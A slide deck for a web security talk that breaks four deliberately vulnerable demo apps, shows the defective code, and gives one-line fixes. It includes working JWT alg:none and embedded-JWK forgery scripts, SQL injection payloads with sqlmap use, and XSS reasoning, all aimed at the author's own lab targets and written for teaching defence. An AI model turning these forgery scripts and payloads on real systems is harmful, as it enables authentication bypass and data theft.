---
marp: true
theme: default
paginate: true
---

# Web Security Fundamentals

## Four real applications, four broken trust boundaries

**Bahati** · Saturday 3 October 2026

Everything in this talk is public and in the repository, including the source
of every application, the reference solutions, and the verification script:

**<https://github.com/meshackbahati/web-sec-fund>**

> Authorised testing only. The four applications in this talk are deliberately
> vulnerable, deployed by me for this demonstration, and contain no real data.

<!--
Welcome. Four live applications, each with one real defect that I wrote on
purpose. I will break each one, read you the single line that made it
break, fix that line, and then run the same attack again to prove the fix
held.

The audience for this is mixed: some of you have never written an application,
some of you ship them daily. So I am going to define every term the first time
it appears. If you already know it, skip ahead; the definition slides are
also a reference you can come back to.
-->

---

# The plan

1. **Definitions**, the vocabulary up front
2. **The one idea** behind all four bugs
3. **Four applications**, one each:
   - Session Forge, a forged identity
   - Clearance, a query you should not have been able to write
   - Reflector, code running in someone else's browser
   - Keyring, a lock that accepts the wrong key
4. **The fixes**, one line each
5. **Defending properly**

Everything is demonstrated live. Nothing is simulated.

<!--
Set expectations: this is not a tool tutorial. It is about one recurring
mistake, seen four times, in four places you all work in.
-->

---

# Definition: web application

A **web application** is a program you talk to over the network using HTTP.

Two sides:

- The **client**, usually a browser. It sends requests and renders what comes
  back.
- The **server**, your code. It receives the request, decides what to do, and
  returns a response.

```
browser  ────  GET /catalogue?category=Home  ────▶  server
         ◀───  200 OK, HTML                     ─────
```

<!--
The single most important structural fact for this talk: the client is not
part of your program. Everything the client sends is input from someone you
do not control. That is the root of all four bugs.
-->

---

# Definition: HTTP request

A **request** is a message from client to server with four parts that matter:

| Part | Example | Meaning |
|---|---|---|
| **Method** | `GET` | What kind of action: fetch, submit, delete |
| **Path** | `/admin` | Which resource |
| **Headers** | `Cookie: session=…` | Metadata, including who you claim to be |
| **Body** | `username=wiener` | Data being sent |

A **response** carries a **status code**: `200` success, `302` redirect,
`403` forbidden, `500` server error.

<!--
Point out that authentication information travels in the Cookie header. That
is why a defect in how the server reads that header becomes an authentication
bypass. Hold that thought for demo one.
-->

---

# Definition: untrusted input

**Untrusted input** is any value that reached your server without your code
creating it.

Form fields, query strings, cookies, headers, JSON bodies, file names. All of
it. So is anything derived from it.

> The rule this talk is built on: **input is data, never instructions.**

When a server lets input change the *meaning* of a query, a template, or a
verification routine, the input has become instructions.

<!--
This is the definitional core. If people remember one thing, it should be
this. Every demo is an instance of untrusted input being treated as
instructions.
-->

---

# Definition: authentication and authorisation

**Authentication**: *who are you?*
Proves an identity. Password, multi-factor code, passkey.

**Authorisation**: *what may you do?*
Decides whether that identity may perform this action.

They are different questions, and confusing them is common:

- You can be **authenticated** and still **not authorised**. Signing in as
  `wiener` proves who you are; it does not give you the admin panel.
- Every one of my four demos is an **authorisation** failure, not an
  authentication failure. Nobody broke a password. They talked their way past
  a check.

<!--
Emphasise this. Most people assume "hacked" means "password stolen". Three
of these four bugs are reached with completely valid, correctly issued
credentials.
-->

---

# Definition: session and cookie

The server must remember who you are across requests. HTTP does not do this
natively. Each request stands alone.

**Server-side session:** the server keeps the state, the browser holds an
opaque reference (a random string) in a **cookie**.

```
cookie: session=8f2a91c4…      ← meaningless on its own, a lookup key
server: session store maps 8f2a91c4 → { user: wiener }
```

**Stateless session (JWT):** all the state travels *inside* the cookie.

<!--
Ask the room which they prefer and why. Then reveal the trade: server-side
sessions are revocable; self-contained tokens are not, because the server has
nothing to look up and delete. That trade is the reason JWT authentication
bugs exist.
-->

---

# Definition: JSON Web Token

A **JWT** is three base64url-encoded segments joined by dots.

```
eyJhbGciOiJIUzI1NiJ9 . eyJzdWIiOiJ3aWVuZXIifQ . 7Vm1k2l…
└──── header ────┘   └──── payload ────┘   └─ signature ─┘
```

- **header**: metadata, including which algorithm signed it
- **payload**: the claims: `sub` (subject, the user), `exp` (expiry), `role`
- **signature**: proof the token was not altered

A **claim** is a key/value statement inside the payload. `sub: "wiener"` is a
claim. So is `role: "administrator"`.

> base64url is an *encoding*, not encryption. **Anyone holding a JWT can read
> it.** Open yours in any text editor.

<!--
Demo the decoding live if there is time. It is the moment the room
understands that a token is not a secret.
-->

---

# Definition: base64url

An **encoding**: a reversible translation of bytes into text that survives
being put in a URL or a cookie.

Ordinary base64 uses `+` and `/`, which are awkward in URLs, so base64url swaps
them for `-` and `_` and drops the `=` padding.

It provides **no confidentiality whatsoever.** Its only job is transport.

<!--
Short slide. The only point is: encoding is not encryption, and anyone can
undo it in one command.
-->

---

# Definition: HMAC and digital signature

A **digital signature** proves two things: the message came from the holder of
a secret key, and it has not changed since.

**HS256** is HMAC using SHA-256:

```
signing_input = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ3aWVuZXIifQ"
signature     = base64url( HMAC-SHA256( secret_key , signing_input ) )
```

To verify, the server recomputes the same value with its own key and compares
it **in constant time**: a comparison that takes the same time whether it
matches or not, so it cannot be timed to leak the answer.

<!--
Use an analogy: a wax seal. Anyone can inspect it; nobody can reproduce it
without the sealing wax. And because the seal covers the exact text, changing
one character invalidates it.
-->

---

# Definition: algorithm confusion

Tokens may be signed two ways:

| | Signs with | Verifies with | Both keys known to you? |
|---|---|---|---|
| **HS256** | one shared secret | same secret | only the server |
| **RS256** | private key | public key | **the public key is public** |

**Algorithm confusion** happens when a server holding both key types decides
which to use by reading the `alg` value *from the token itself*.

The attacker then presents an `HS256` token and supplies the **public** key as
the HMAC secret. The server verifies with a key the attacker chose, and
concludes the token is genuine.

> The server must choose the algorithm. Never let the token decide.

<!--
This is demo one's sibling. Demo one takes the simplest version of the same
mistake: trusting the token's algorithm at all.
-->

---

# The four targets

| | Application | The one defect | Where it lives |
|---|---|---|---|
| 01 | **Session Forge** | trusts the `alg` inside the token | the token boundary |
| 02 | **Clearance** | concatenates input into SQL | the query boundary |
| 03 | **Reflector** | writes input into HTML unencoded | the rendering boundary |
| 04 | **Keyring** | verifies with a key the token carries | the key boundary |

All four: Next.js, SQLite, deployed on Vercel, and reachable now.

<!--
Each is a separate application with its own look, so the audience can see they
are not four aliases of one lab. Same underlying idea each time.
-->

---

# Demo 1: Session Forge

**<https://northwind-01-session-forge.vercel.app>**

Sign in as a normal employee. The goal is the administration page.

Here is the real verification function, from
`apps/01-session-forge/lib/store.js`:

```js
export function verifyToken(token) {
  /* decode header and payload */

  // VULNERABLE (application 01)
  if (header.alg === 'none') {
    const unsignedExpiry = Math.floor(Date.now() / 1000);
    if (typeof payload.exp === 'number' && payload.exp < unsignedExpiry) return null;
    return { ...payload, _verified: false };
  }

  if (header.alg !== 'HS256') return null;   // everything else is pinned
}
```

And here is the entire authorisation boundary, from `app/admin/route.js`,
identical in all four applications:

```js
if (claims.sub !== 'administrator') {
  return refuse(`... the session you are holding belongs to "${claims.sub}".`);
}
```

One comparison. `alg` comes from the token, so the attacker edits the header,
the attacker chooses which branch runs, and the attacker picks the one that
skips verification.

<!--
Count the lines. The whole authorisation boundary in this application is one
comparison. Emphasise how little code has to be exactly right.
-->

---

# What correct looks like

Every application is a copy of one reference implementation with exactly one
marked substitution. The correct `verifyToken`, in `apps/_shared/store.js`:

```js
// CORRECT: the server decides which algorithm is acceptable.
if (header.alg !== ACCEPTED_ALGORITHM) return null;

// CORRECT: raw bytes on both sides. Comparing the base64url text would
// compare a 43-byte string against a 32-byte MAC and never match.
const expected = createHmac(HMAC_ALGORITHM, signingSecret())
  .update(`${encodedHeader}.${encodedPayload}`)
  .digest();
const provided = Buffer.from(encodedSignature, 'base64url');
if (expected.length !== provided.length || !timingSafeEqual(expected, provided)) {
  return null;
}
```

Three things to notice: the algorithm is pinned by the server, the MAC is
compared in constant time, and the comparison is on raw bytes.

---

# Demo 1: the attack

Everything below is typed live. Watch the status codes.

```bash
BASE=https://northwind-01-session-forge.vercel.app
```

**1. Sign in as a normal employee.** The token arrives in the response:

```bash
curl -s -c jar.txt -o /dev/null -X POST \
  -d 'username=wiener&password=peter' "$BASE/login"

set-cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJub3J0a…
            Path=/; HttpOnly; SameSite=Lax; Secure
```

**2. Replay that token against the admin page.** The boundary works:

```bash
curl -s -b jar.txt -o /dev/null -w 'HTTP %{http_code}\n' "$BASE/admin"
# HTTP 403
```

**3. Rebuild the token.** `alg` becomes `none`, `sub` becomes
`administrator`, the signature is emptied, and the trailing dot is kept because
the parser splits on it:

```bash
TOKEN=$(awk '/session/{print $7}' jar.txt)

FORGED=$(python3 - <<'PY'
import base64, json, time
def b64(raw): return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
now = int(time.time())
header  = {"alg": "none", "typ": "JWT"}
payload = {"iss": "northwind.supply", "iat": now, "exp": now + 3600,
           "sub": "administrator", "name": "Wiener Vogel"}
print(b64(json.dumps(header,  separators=(",", ":")).encode()) + "." +
      b64(json.dumps(payload, separators=(",", ":")).encode()) + ".")
PY
)

echo "$FORGED"
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJub3J0aHdpbmQuc3VwcGx5Iiwi…
```

Three edits, and **no cryptography is performed**: `alg: none` means there is
no signature to compute.

**4. Replay it.** Same request, different cookie:

```bash
curl -s -H "Cookie: session=$FORGED" "$BASE/admin" | grep -oE 'G24\{[^}]+\}'
# G24{N0t_4_Cl4im_V3r1f13d}
```

An empty signature over an unverified token is indistinguishable from a real
one to a server that never checked.

<!--
Type the payload on screen if you can. The 'none' algorithm performing no
maths whatsoever is the memorable moment.

In Burp Suite rather than curl: intercept the POST to /login, read the session
cookie out of the Set-Cookie header, then send GET /admin to Repeater with that
cookie to confirm the 403. The JWT Editor extension, from the BApp store,
decodes and re-encodes the token in place: switch the message editor to the
JSON Web Token tab, set the header's alg to none, change the sub claim to
administrator, and send the embedded request directly to Repeater. No manual
base64 required, which is the honest way to do it in a real engagement.
-->

---

# Demo 1: the fix

Delete the branch that trusts the token's `alg`:

```js
if (header.alg !== 'HS256') return null;
```

Better still: pin the algorithm in the library's own options rather than in
your code, and reject `none` explicitly.

**Lesson:** the server decides which algorithm verifies a token, never the
token.

---

# Definition: SQL and a query

**SQL** is the language databases are asked questions in.

```sql
SELECT sku, name, price FROM products WHERE category = 'Home';
```

- **SELECT … FROM**: which columns, from which table
- **WHERE**: which rows
- `'Home'`: a **string literal**: text, quoted, not a command

A **table** is rows and columns; here, one row per product.

<!--
Analogy: the query is a sentence with blanks. Parameterisation is filling the
blanks with values. String concatenation is letting the user write the
sentence. Demo two is about the difference.
-->

---

# Definition: parameterisation

The safe way to filter. You send the **shape** of the query and the **value**
separately:

```js
db.prepare(
  "SELECT … FROM products WHERE category = ? AND classification = 'public'"
).all(category);
```

The database receives:

- the statement, with `?` placeholders
- the value, `Home`

It parses the statement once and treats the value strictly as data. It is
**never parsed as SQL**, no matter what it contains.

The unsafe way builds the sentence with the value pasted in:

```js
`… WHERE category = '${category}' …`
```

<!--
This is the single most useful slide for a developer audience. If you take one
defence away, take this one.
-->

---

# Demo 2: Clearance

**<https://northwind-02-clearance.vercel.app>**

No login needed. The catalogue filter is the whole target. Built in
`apps/02-clearance/app/catalogue/route.js`:

```js
// VULNERABLE (application 02)
const sql = `SELECT sku, name, category, price_cents, classification`
          + ` FROM products WHERE category = '${category}'`
          + ` AND classification = 'public' ORDER BY id`;

rows = db().prepare(sql).all();
``` Built in
`apps/02-clearance/app/catalogue/route.js`:

```js
// VULNERABLE (application 02)
const sql = `SELECT sku, name, category, price_cents, classification`
          + ` FROM products WHERE category = '${category}'`
          + ` AND classification = 'public' ORDER BY id`;

rows = db().prepare(sql).all();
```

With `category` set to `Home' OR 1=1--`:

```sql
WHERE category = 'Home' OR 1=1--' AND classification = 'public'
                         ─────  ─────────  ──
                         true   true        comment
```

- The `'` **closes the string literal**
- `OR 1=1` is **always true**
- `--` **comments out the rest of the line**, including the clearance filter

Watch the row count change between two requests that differ only in one
value:

```bash
BASE=https://northwind-02-clearance.vercel.app

curl -s -G --data-urlencode 'category=Home' "$BASE/catalogue" \
  | grep -oE 'NW-[A-Z0-9-]+' | sort -u
# NW-HOM-101  NW-HOM-102  NW-HOM-103  NW-HOM-104
```

```bash
curl -s -G --data-urlencode "category=Home' OR 1=1--" "$BASE/catalogue" \
  | grep -oE 'NW-[A-Z0-9-]+|G24\{[^}]+\}' | sort -u
# NW-GFT-301 … NW-TRD-501  NW-TRD-502  NW-TRD-503  NW-TRD-902  G24{InpuT_Becam3_C0d3}
```

4 rows becomes 16, including the withheld trade lines and the flag. The
`UNION` variant shown earlier then dumps the schema itself.

<!--
Build the query on screen, character by character. Beginners find the
comment-out surprising: a double dash is enough to delete the rest of your
query.
-->

---

# Two details that cost us real time

**`--` ends at the newline.** When the two conditions sat on separate lines,
the clearance filter survived the comment and the attack silently returned
only public rows. It looked like the exploit had failed.

**A `UNION` needs matching column counts** or SQLite rejects the whole
statement, so the injected `SELECT` must project exactly as many columns as
the original.

That second one turns a bypass into arbitrary read:

```
x' UNION SELECT sql,name,type,name,0 FROM sqlite_master WHERE type='table'--
```

That reads the database's own schema. Arbitrary read, not just a bypass.

<!--
Both of these are the kind of thing that makes a demo fail on the day. They
are here so nobody in the audience loses twenty minutes to them.
-->

---

<!--
In Burp Suite: intercept GET /catalogue?category=Home and send it to Repeater.
Edit the parameter value to Home' OR 1=1-- and resend. Repeater shows the row
count changing with the response size in the footer, which is a quick sanity
check that the injection did something before you read the body. sqlmap finds
this unaided, so it is worth running once as confirmation:
sqlmap -u "$BASE/catalogue?category=Home" --batch --risk=2 --level=3
-->

---

# Demo 2: the fix

```js
const sql = `SELECT … WHERE category = ? AND classification = 'public' ORDER BY id`;
rows = db.prepare(sql).all(category);
```

One line. The input becomes data again.

An allow-list of permitted categories is a useful **second** layer.
Parameterisation is the actual control.

> "We sanitised it" is not a fix. Escaping quotes does not help, and
> blacklisting `OR` and `UNION` is a losing game.

Also: this app returns the database error to the user. That is a second
finding. It turns a blind injection into a verbose one.

---

# Definition: HTML and parsing

**HTML** is a text format that a browser **parses** into a document.

```html
<p class="name">Enamel Kettle</p>
 ▲                    ▲
 element          attribute
```

The parser has one job: decide what is **markup** and what is **text**.

It has no way to know which characters you *meant* as markup. If a template
writes user input straight into the page, the parser simply finds a `<script>`
element and runs it.

<!--
Key sentence: the browser cannot tell the difference between text you wrote
and an instruction you wrote. That is why the fix is encoding.
-->

---

# Definition: output encoding

**Encoding** replaces characters that mean something structural with
inert equivalents:

| You write | User sees | Parser sees |
|---|---|---|
| `<script>` | `<script>` | text, not an element |
| `&` | `&` | not the start of an entity |

```js
escapeHtml('<script>')   // '&lt;script&gt;'
```

This restores the distinction the parser lost. It is **context-specific**: the
correct encoding for HTML text is not the one for a JavaScript string, an
attribute value, or a URL.

<!--
Encoding is data-side, not input-side. You do not clean input on the way in;
you encode on the way out. Repeat that twice.
-->

---

# Demo 3: Reflector

**<https://northwind-03-reflector.vercel.app>**

`app/search/route.js` contains both renderings of the same value, some
lines apart:

```js
// correct: the search box
<input type="search" name="q" value="${escapeHtml(query)}" ...>

// VULNERABLE (application 03): the results heading
<h2>${rows.length} results for &ldquo;${query}&rdquo;</h2>
```

One is escaped. The other is not. The browser cannot tell which characters were
meant as text.

First, from a terminal. This is what an attacker gets:

```bash
BASE=https://northwind-03-reflector.vercel.app

curl -s -H 'X-Requested-With: XMLHttpRequest' "$BASE/console"
# { "error": "administrator session required" }
```

The flag is not here and cannot be reached from a shell. `app/console/route.js`
has two gates:

```js
if (claims?.sub !== 'administrator') return json({ ... }, 403);
if (request.headers.get('x-requested-with') !== 'XMLHttpRequest') {
  return json({ ... }, 403);
}
```

So the flag cannot be fetched from a shell. It can only be read by a
**browser executing script in an administrator's session**, which is exactly
what the injected script does. Sign in as the administrator, open the crafted
search URL, and watch the page title change to the flag as the script runs.

No terminal can substitute for that step, which is why this one application
needs a real browser.

<!--
This is why a browser is required and a curl loop is not. The proof of impact
is that code ran, not that a request was malformed.

In Burp Suite: send the crafted URL through the browser configured to use it
as its proxy, so the injected request appears in Proxy history. Repeater shows
the fetch to /console with the X-Requested-With header the server demands,
sent from the victim's session. That single line in the history is the evidence
that this was script execution rather than a crafted request, and it is worth
pointing at explicitly.
-->

---

# The shape of the attack

Notice what the attacker did **not** do:

- did not steal a password
- did not obtain the administrator's session cookie
- did not send a single request to the console

The link carries a payload. An administrator opens it. The script runs **in
their browser**, with their session, and calls the console as them.

> That is what cross-site scripting means: running code in someone else's
> browser, with their privileges.

---

# A subtlety worth naming

The session cookie in these applications is marked **`HttpOnly`**, which stops
`document.cookie` from reading the token in JavaScript.

It does **not** stop this attack.

`HttpOnly` prevents cookie theft. It does not prevent the injected script from
*acting as the user*. Both are real mitigations for different problems, and
conflating them is common.

---

# Demo 3: the fix

```js
&ldquo;${escapeHtml(query)}&rdquo;
```

One call. Behind it, a second layer: a **Content Security Policy** forbidding
inline script would have blocked this payload regardless of encoding.

**Encoding is the fix. CSP is the belt.**

---

# Definition: JWK

A **JWK** (JSON Web Key) is a standard way to write a key as JSON.

```json
{ "kty": "oct", "kid": "attacker", "k": "" }
```

The `kid` (**key ID**) names which key signed a token. A legitimate feature
for servers holding several keys.

The mistake is trusting the token to say **which key verifies it**. An empty
key is a perfectly valid HMAC secret, so a token signed with the empty string
verifies.

<!--
The attacker never learns your key. They simply supply the key your check
uses. That is the whole defect.
-->

---

# Demo 4: Keyring

**<https://northwind-04-keyring.vercel.app>**

From `apps/04-keyring/lib/store.js`:

```js
// VULNERABLE (application 04)
if (header.jwk && typeof header.jwk.k === 'string') {
  const embedded = createHmac(HMAC_ALGORITHM, header.jwk.k)
    .update(`${encodedHeader}.${encodedPayload}`)
    .digest();
  const given = Buffer.from(encodedSignature, 'base64url');
  if (embedded.length !== given.length || !timingSafeEqual(embedded, given)) return null;
  return { ...payload, _verified: false };
}
```

```bash
BASE=https://northwind-04-keyring.vercel.app

curl -s -c jar.txt -o /dev/null -X POST \
  -d 'username=wiener&password=peter' "$BASE/login"

curl -s -b jar.txt -o /dev/null -w 'HTTP %{http_code}\n' "$BASE/admin"
# HTTP 403
```

Now the same token with a key attached, and a signature made with the empty
string:

```bash
FORGED=$(python3 - <<'PY'
import base64, hashlib, hmac, json, time
def b64(raw): return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
now = int(time.time())
header  = {"alg": "HS256", "typ": "JWT",
           "jwk": {"kty": "oct", "kid": "attacker", "k": ""}}
payload = {"iss": "northwind.supply", "iat": now, "exp": now + 3600,
           "sub": "administrator"}
signing_input = ".".join(
    b64(json.dumps(part, separators=(",", ":")).encode())
    for part in (header, payload))
sig = hmac.new(b"", signing_input.encode(), hashlib.sha256).digest()
print(f"{signing_input}.{b64(sig)}")
PY
)

curl -s -H "Cookie: session=$FORGED" -o /dev/null -w 'HTTP %{http_code}\n' "$BASE/admin"
# HTTP 200
```

Genuine token → **403**. Forged token with an embedded empty key → **200** and
the flag.

> General rule: an identifier from untrusted input may select from an
> **allow-list**. It must never select from a namespace the attacker can
> address.

<!--
An earlier version of this application used kid path traversal to read
/dev/null. That works on a laptop and cannot work on a serverless platform,
whose sandbox refuses traversal reads. Same lesson, and it now behaves
identically everywhere.
-->

---

<!--
In Burp Suite: intercept the login response and copy the token, then send
GET /admin to Repeater with the forged cookie. The JWT Editor extension can
also add an arbitrary header claim, so the jwk object can be pasted into the
header tab and the token re-signed with an empty key, which is a good way to
show that the extension does not need to understand the attack, only the
format.
-->

---

# The same four, in Burp Suite

Everything just shown by hand is what a proxy makes routine.

| | Where in Burp | What you do |
|---|---|---|
| **01** | JWT Editor extension (BApp store) | Re-encode the token in the message editor: `alg` to `none`, `sub` to `administrator`, send to Repeater |
| **02** | Repeater | Intercept `GET /catalogue`, edit the parameter, resend. `sqlmap -u … --batch` also finds it unaided |
| **03** | Proxy history | Proxy the browser, open the crafted URL, and read the injected `fetch('/console')` in the history |
| **04** | JWT Editor extension | Add an arbitrary header claim carrying the `jwk`, re-sign with an empty key |

Two habits worth keeping:

- **Confirm the boundary before you bypass it.** Replay the genuine token first.
  A 403 afterwards is evidence; without it, it may just be a broken cookie.
- **Read the footer.** Response size and status change long before you have
  read the body, which makes them a fast sanity check.

<!--
The extension does not need to understand the attack, only the format. That is
the honest way to describe every tool in this talk: they move bytes, and the
mechanism is in the server.
-->

---

# Reading the results honestly

| Attack | Unpatched | After the one-line fix |
|---|---|---|
| 01 forged `alg:none` token | flag returned | rejected |
| 02 `OR 1=1` tautology | flag returned | treated as data |
| 03 reflected script | flag returned | encoded |
| 04 embedded JWK | flag returned | key no longer chosen |

Thirteen automated checks pass against the live deployments
(`apps/solve/verify.sh`), including an assertion that the deployed builds are
the **vulnerable** ones, so the demonstrations cannot silently stop working.

<!--
State plainly which direction each control works. If a control only makes an
exploit harder rather than impossible, say so.
-->

---

# How to defend, in order of value

1. **Parameterise every query.** No exceptions, no "just this once".
2. **Encode output for its context.** Every time, at the point of output.
3. **Deny by default.** Check ownership server-side on every request.
4. **Pin token algorithms** in library configuration.
5. **Never let a token choose its own key.**
6. **Content Security Policy** as a second layer, not the first.
7. **Do not return errors to users.**
8. **Hash passwords** with argon2id or bcrypt. Not SHA-256. Not "base64".
9. **Keep secrets out of the repository** and rotate them.
10. **Log and monitor** authentication and authorisation decisions.

---

# What to take away

- **Never trust a claim you have not verified**, including one the client
  wrote for you.
- The client is not part of your program. Everything it sends is input.
- **Authorisation is not authentication.** Signing in proves nothing about
  permission.
- Encoding and parameterisation are not optional extras. They are the control.
- Defence in depth: encoding *and* CSP, authorisation *and* ownership checks.
- Most of these bugs are one line long. That is why review matters.

---

# If you take one thing

> Input is data. Never instructions.

Everything in the next hour is a consequence of breaking that rule: in a
token header, in a SQL string, in an HTML page, and in a key lookup.

---

# Everything here is public

**<https://github.com/meshackbahati/web-sec-fund>**

| In the repository | What it is |
|---|---|
| `apps/01-session-forge` … `apps/04-keyring` | the four applications, with a `WRITEUP.md` beside each |
| `apps/CHALLENGES.md` | all four write-ups together, with the shared mechanisms |
| `apps/solve/` | the reference solutions and `verify.sh`, thirteen checks |
| `apps/build.mjs` | regenerates all four from one implementation |
| `apps/deploy.sh` | deploys all four and sets their flags as secrets |

Clone it and run `bash apps/solve/verify.sh` to see every attack in this talk
execute against the live deployments.

---

# Resources

- **PortSwigger Web Security Academy**, free legal labs:
  <https://portswigger.net/web-security>
- **OWASP Cheat Sheet Series**, the practical reference:
  <https://cheatsheetseries.owasp.org>
- **RFC 7519** (JWT) and **RFC 7515** (JWS):
  <https://www.rfc-editor.org/rfc/rfc7519>
- **MDN**: HTTP, cookies, CSP, CORS:
  <https://developer.mozilla.org>
- Live targets, one per application: `apps/deployments.md` in the repository

---

# Thank you

Questions?

> Authorised testing only. These applications exist to be attacked, contain
> real defects and no real data, and are removed once the event is over.
> Never use these techniques against systems you have no permission to test.